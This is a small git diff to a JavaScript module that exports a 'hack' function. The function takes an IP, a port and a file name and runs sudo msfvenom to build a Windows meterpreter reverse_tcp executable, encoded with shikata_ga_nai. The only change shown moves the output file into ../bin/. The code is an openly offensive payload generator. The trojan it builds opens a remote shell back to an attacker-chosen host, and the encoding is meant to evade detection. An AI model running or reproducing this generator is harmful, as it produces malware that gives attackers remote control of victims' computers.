@@ -22,7 +22,7 @@ exports.hack = (exec) => {
       },
     ])
     .then((response) => {
-      const command = `sudo msfvenom -a x86 –platform windows -p windows/meterpreter/reverse_tcp LHOST=${response.ip} LPORT=${response.port} -b x00 -e x86/shikata_ga_nai -f exe -o ${response.fileName}.exe`;
+      const command = `sudo msfvenom -a x86 –platform windows -p windows/meterpreter/reverse_tcp LHOST=${response.ip} LPORT=${response.port} -b x00 -e x86/shikata_ga_nai -f exe -o ../bin/${response.fileName}.exe`;
 
       exec(command, (error, stdout, stderr) => {
         console.log("stdout", stdout);
